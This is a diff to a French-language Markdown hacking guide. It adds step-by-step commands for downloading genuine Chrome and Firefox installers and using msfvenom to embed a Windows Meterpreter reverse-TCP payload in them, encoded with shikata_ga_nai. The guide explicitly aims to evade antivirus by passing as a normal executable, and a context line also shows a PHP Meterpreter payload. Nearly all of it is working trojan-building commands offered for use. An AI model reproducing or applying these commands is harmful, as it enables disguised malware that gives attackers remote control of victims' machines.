@@ -238,10 +238,31 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.101 lport=7000 -f raw >
 
 ## dans virtual box :
 
-### dans kali linux changer la configuration du reseau en acces par pont , cela permettra de telecharger les fichier exe comme chrome ou firefox, vous pourrez inserrez votre malwar dans un vrai exe connu comme chromesetup.exe notament avec cette commande. vous serrez le plus discret avec les anti virus en vous faisant passer pour un executable tout a fait normal ( en conservant sa signature)
+### dans kali linux changer la configuration du reseau en acces par pont , cela permettra de telecharger les fichier exe comme chrome ou firefox, vous pourrez inserrez votre malwar dans un vrai exe connu comme chromesetup.exe. vous serrez le plus discret avec les anti virus en vous faisant passer pour un executable tout a fait normal ( en conservant sa signature)
+
+## la commande pour telecharger chrome exe :
 
 ````bash
-msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=3000 -f exe -e x86/shikata_ga_nai -i 10 -k -x /root/Bureau/Outils/firefox.exe -o /home/kali/Desktop/fichier.exe
+wget -4 -O ChromeSetup.exe "https://dl.google.com/chrome/install/latest/chrome_installer.exe"
+ls
+````
+
+## ou firefox :
+
+````bash
+wget -4 -O FirefoxInstaller.exe "https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=fr"
+````
+
+## puis la commande pour faire le malwar dans le chrome telecharger :
+
+````bash
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=3000 -f exe -e x86/shikata_ga_nai -i 10 -k -x /root/Bureau/Outils/chrome.exe -o /home/kali/Desktop/chrome_setup.exe
+````
+
+## ou firefox :
+
+````bash
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=3000 -f exe -e x86/shikata_ga_nai -i 10 -k -x /root/Bureau/Outils/firefox.exe -o /home/kali/Desktop/firefox_setup.exe
 ````
 
 <img width="1392" height="733" alt="image" src="https://github.com/user-attachments/assets/8f901a2e-b4c9-4794-b8e1-8bd1ea27088a" />
